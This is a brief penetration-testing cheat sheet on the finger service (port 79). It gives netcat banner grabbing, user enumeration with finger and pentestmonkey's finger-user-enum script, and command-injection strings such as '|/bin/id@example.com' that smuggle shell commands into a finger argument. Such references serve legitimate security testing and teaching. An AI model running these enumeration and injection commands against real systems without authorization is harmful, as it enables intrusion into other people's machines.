- - -
**Finger** is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.
- - -
### Banner Grabbing/Basic connection : 

```sh
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```

##### User Enumeration : 

```sh
finger @<Victim>                                   #List users
finger admin@<Victim>                              #Get info of user
finger user@<Victim>                               #Get info of user
```

#### Using **finger-user-enum** from [**pentestmonkey**](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum) : 

```sh
finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt
```

- - -
### Try Command execution :

```sh
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```

- - -








